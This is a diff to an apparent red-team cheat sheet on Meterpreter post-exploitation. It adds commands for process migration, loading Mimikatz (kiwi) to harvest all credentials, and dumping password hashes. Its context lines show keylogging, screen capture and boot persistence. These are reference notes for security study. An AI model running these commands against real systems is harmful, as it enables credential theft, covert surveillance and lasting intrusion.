@@ -73,11 +73,6 @@ exploit> check opt=value opt2=value [...]
 
 ## Meterpreter
 
-[![blue](../../../../_badges/thm-p/blue.svg)](https://tryhackme.com/room/blue)
-[![ice](../../../../_badges/thm-p/ice.svg)](https://tryhackme.com/room/ice)
-[![blaster](../../../../_badges/thm-p/blaster.svg)](https://tryhackme.com/room/blaster)
-[![steelmountain](../../../../_badges/thmp-p/steelmountain.svg)](https://tryhackme.com/room/steelmountain)
-
 <div class="row row-cols-lg-2"><div>
 
 #### Meterpreter — Overview
@@ -148,6 +143,8 @@ meterpreter> lcat file # Show the contents of a local file
 ```
 </div><div>
 
+#### Meterpreter — Pop a shell
+
 You can also pop a shell if you want to:
 
 ```shell!
@@ -158,6 +155,22 @@ meterpreter> shell # "sh" on Linux, "cmd" on Windows
 meterpreter> load powershell
 meterpreter> powershell_shell
 ```
+
+<br>
+
+#### Meterpreter — Migrate
+
+To run some utilities or exploits on Windows, we often need to move to a stable privileged owned by "NT AUTHORITY\SYSTEM."
+
+```shell!
+meterpreter> ps # list process
+meterpreter> migrate process_pid # move to another process
+meterpreter> migrate -N process_name # same
+meterpreter> migrate -N spoolsv.exe # can restart so good
+meterpreter> migrate -N explorer.exe # screenshots...
+```
+
+<br>
 
 #### Meterpreter — Enumeration
 
@@ -194,13 +207,20 @@ You can automatically try to exploit [your privileges](/cybersecurity/red-team/s
 meterpreter> getsystem -h # List exploits
 ```
 
+We often want to load and use [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md):
 
-
+```shell!
+meterpreter> load kiwi
+meterpreter> migrate some_process_nt_system_compatible
+meterpreter> creds_all # retrieve all credentials
+```
 </div></div>
 
 <hr class="sep-both">
 
 ## Metasploit Post-Exploitation
+
+*All modules below should require administrative permissions...*
 
 <div class="row row-cols-lg-2"><div>
 
@@ -237,7 +257,6 @@ meterpreter> migrate -N explorer.exe
 meterpreter> use espia
 meterpreter> screengrab
 ```
-</div><div>
 
 #### Meterpreter — Install a keylogger
 
@@ -246,6 +265,7 @@ meterpreter> migrate -N explorer.exe
 meterpreter> keyscan_start # start
 meterpreter> keyscan_dump # dump keys
 ```
+</div><div>
 
 #### Meterpreter — Watch the screen in real time
 
@@ -277,6 +297,13 @@ See [METERPRETER SERVICE](https://www.offensive-security.com/metasploit-unleashe
 ```shell!
 meterpreter> # Automatically start the agent when the system boots
 meterpreter> run persistence -X
+```
+
+#### Meterpreter — Dump Hashes
+
+```shell!
+meterpreter> hashdump
+meterpreter> run post/linux/gather/hashdump # cat /etc/shadow?
 ```
 </div></div>
 
